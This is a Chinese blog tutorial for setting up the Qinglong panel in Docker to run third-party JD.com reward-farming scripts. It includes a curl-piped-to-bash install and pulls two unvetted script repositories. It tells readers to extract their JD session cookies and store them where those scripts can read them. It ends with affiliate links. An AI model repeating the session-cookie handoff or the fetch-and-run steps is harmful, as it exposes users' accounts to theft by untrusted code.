<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1671197024711-c40d51cf-3e65-43b9-a239-ab73bcf7daac.jpeg" alt="1671197024711-c40d51cf-3e65-43b9-a239-ab73bcf7daac"></p>
<h1 id="二、安装docker"><a href="#二、安装docker" class="headerlink" title="二、安装docker"></a>二、安装docker</h1><p> 已经安装Docker的可以跳过这一步，没有安装的可以使用以下命令直接安装Docker。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>

<p>安装Docker启动Docker，配置开机启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker  <span class="comment">#启动Docker</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker <span class="comment">#配置开机自启</span></span><br></pre></td></tr></table></figure>

<h1 id="三、安装docker-compose"><a href="#三、安装docker-compose" class="headerlink" title="三、安装docker-compose"></a>三、安装docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h1 id="四、启动容器"><a href="#四、启动容器" class="headerlink" title="四、启动容器"></a>四、启动容器</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir qinglong</span><br><span class="line">wget https://raw.githubusercontent.com/whyour/qinglong/master/docker/docker-compose.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

<p>打开你的浏览器，访问 http://{ip}:5700</p>
<h1 id="五、打开防火墙"><a href="#五、打开防火墙" class="headerlink" title="五、打开防火墙"></a>五、打开防火墙</h1><p>青龙面板默认端口是5700，记得在防火墙上设置放行。腾讯云可以在安全组中设置</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1671200490505-e56e1657-91fb-48d6-9a65-f202cde3918f.png" alt="1671200490505-e56e1657-91fb-48d6-9a65-f202cde3918f"></p>
<h1 id="六、配置青龙"><a href="#六、配置青龙" class="headerlink" title="六、配置青龙"></a>六、配置青龙</h1><h2 id="1、面板处设置"><a href="#1、面板处设置" class="headerlink" title="1、面板处设置"></a>1、面板处设置</h2><p>初始页面会让我们设置密码以及推送机器人，机器人我选择的是Server酱，当然其实也可以不配置机器人，因为几乎没有什么用，我们需要的只是自动运行脚本，通知这个功能只是次要。</p>
<p>如果忘记了面板密码，可以在该auth.json下找到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /root/qinglong/data/config/auth.json</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1671201301387-591b7298-6142-4887-8900-3a997f155559.png" alt="1671201301387-591b7298-6142-4887-8900-3a997f155559"></p>
<h2 id="2、添加定时任务"><a href="#2、添加定时任务" class="headerlink" title="2、添加定时任务"></a>2、添加定时任务</h2><p>青龙面板本身不具备任何脚本功能，只是一个管理和执行相应脚本的平台。</p>
<p>点击<code>定时任务</code>–&gt;<code>添加任务</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1671201486240-86592fd3-ae0a-4753-96a9-c026ddc0e061.png" alt="1671201486240-86592fd3-ae0a-4753-96a9-c026ddc0e061"></p>
<p>这里我用的是以下两个库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Fake库：ql repo https://ghproxy.com/https://github.com/shufflewzc/faker2.git <span class="string">&quot;jd_|jx_|getJDCookie&quot;</span> <span class="string">&quot;activity|backUp&quot;</span> <span class="string">&quot;^jd[^_]|USER|ZooFaker_Necklace&quot;</span></span><br><span class="line"></span><br><span class="line">KingRan/KR：ql repo https://github.com/KingRan/KR.git <span class="string">&quot;jd_|jx_|jdCookie&quot;</span> <span class="string">&quot;activity|backUp&quot;</span> <span class="string">&quot;^jd[^_]|USER|utils|function|sign|sendNotify|ql|JDJR&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1671201556403-b39b10ae-769f-425f-89c6-d2156fc46783.png" alt="1671201556403-b39b10ae-769f-425f-89c6-d2156fc46783"></p>
<p>定时规则如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">秒 分 时 天 月 周</span><br></pre></td></tr></table></figure>

<h2 id="3、获取Cookie"><a href="#3、获取Cookie" class="headerlink" title="3、获取Cookie"></a>3、获取Cookie</h2><p>电脑端可以使用网页登录京东账号后使用开发者工具–Network捕捉Cookie，手机端可以使用Alook浏览器登录后捕捉Cookie。我们获取到的Cookie是很长一串的，但我们只需要pt_key和pt_pin即可，格式如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pt_key=xxxx;pt_pin=xxxx;</span><br></pre></td></tr></table></figure>

<h2 id="4、新建环境变量"><a href="#4、新建环境变量" class="headerlink" title="4、新建环境变量"></a>4、新建环境变量</h2><p>环境变量–&gt;添加变量，名称为JD_COOKIE，值为刚复制的京东账号Cookie，备注自己填方便识别，别的不需要动。添加后点确定就可以，</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1671202159238-06893669-ded9-4542-871f-46142bda24ed.png" alt="1671202159238-06893669-ded9-4542-871f-46142bda24ed"></p>
<p>如果需要添加多个账号，只需要获取多个Cookie添加上去就可以了，名称仍然为JD_COOKIE。 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pt_key=xxxx;pt_pin=xxxx;&amp;pt_key=xxxx;pt_pin=xxxx;</span><br></pre></td></tr></table></figure>

<p>完毕，接下来等待脚本自己运行即可。</p>
<h1 id="七、其他"><a href="#七、其他" class="headerlink" title="七、其他"></a>七、其他</h1><h3 id="（1）将京东账号绑定微信："><a href="#（1）将京东账号绑定微信：" class="headerlink" title="（1）将京东账号绑定微信："></a>（1）将京东账号绑定微信：</h3><p>有的活动红包会自动体现到微信，虽然不多，但有</p>
<h3 id="（2）开启京东游戏任务"><a href="#（2）开启京东游戏任务" class="headerlink" title="（2）开启京东游戏任务"></a>（2）开启京东游戏任务</h3><p>建议把所有活动游戏都点击一次，京东工厂这种需要自己选产品的建议自己选，不然会自动选一个，有的干脆不选。这里给大家说下各个游戏入口位置：</p>
<p>京东APP</p>
<ul>
<li>摇钱树：京东APP→右下角我的→中间更多工具</li>
<li>东东萌宠：京东APP→右下角我的</li>
<li>宠汪汪：京东APP→右下角我的</li>
<li>东东农场：京东APP→右下角我的</li>
</ul>
<p>首次<a href="https://wqs.jd.com/sns/202212/05/money_treasure/share.html?_s_p=500bfa3d&nick=j*t&pic=&value=12&channel=jx_yqyl&PTAG=17053.57.1&_fromplatform=jxapp&ad_od=share&utm_source=androidpingouapp&utm_medium=pingouappshare&utm_campaign=t_335139774&utm_term=Wxfriends">下载登陆惊喜APP</a>可以0.01元包邮买东西，<a href="https://wqs.jd.com/sns/202212/05/money_treasure/share.html?_s_p=500bfa3d&nick=j*t&pic=&value=12&channel=jx_yqyl&PTAG=17053.57.1&_fromplatform=jxapp&ad_od=share&utm_source=androidpingouapp&utm_medium=pingouappshare&utm_campaign=t_335139774&utm_term=Wxfriends">&gt;戳我领取&lt;</a></p>
<ul>
<li>京喜工厂：惊喜APP→右下角我的</li>
<li>京喜牧场：惊喜APP→右下角我的</li>
<li>京喜财富岛：惊喜APP→右下角我的</li>
</ul>
<p>首次下载登陆京东特价版可以领5-10元券包邮买东西</p>
<ul>
<li>发财大赢家：京东极速版→右下角我的</li>
<li>汪汪乐园：京东极速版→右下角我的</li>
</ul>
<h3 id="（3）购买云服务器享折扣"><a href="#（3）购买云服务器享折扣" class="headerlink" title="（3）购买云服务器享折扣"></a>（3）购买云服务器享折扣</h3><p> 点击下面链接去购买云服务器：<a href="https://url.cn/mn32xpJz">https://url.cn/mn32xpJz</a> 享折扣。  </p>
]]></content>
      <categories>
        <category>薅羊毛</category>
      </categories>
      <tags>
        <tag>薅羊毛</tag>
      </tags>
  </entry>
</search>
